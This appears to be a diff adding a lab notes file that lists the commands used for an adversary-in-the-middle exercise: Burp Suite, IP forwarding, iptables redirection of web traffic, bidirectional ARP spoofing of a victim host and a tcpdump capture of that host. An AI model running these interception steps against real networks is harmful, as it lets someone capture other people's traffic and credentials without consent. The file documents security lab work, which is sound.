@@ -1,0 +1,20 @@
+# Commands & snippets used in the lab (for documentation)
+
+# Start Burp (Kali)
+burpsuite
+
+# Enable IP forwarding (Kali) for transparent AitM testing
+sudo sysctl -w net.ipv4.ip_forward=1
+
+# Redirect HTTP/HTTPS to Burp (replace iface as needed)
+sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
+
+# ARP spoof (dsniff package)
+sudo arpspoof -i eth0 -t 10.1.16.20 10.1.16.1
+sudo arpspoof -i eth0 -t 10.1.16.1 10.1.16.20
+
+# Tcpdump capture (Kali)
+sudo tcpdump -i eth0 host 10.1.16.20 -w /root/evidence/victim_capture.pcap
+
+# Save Burp HTTP history: Proxy -> HTTP history -> right-click -> Save selected items -> burp_http_history.har
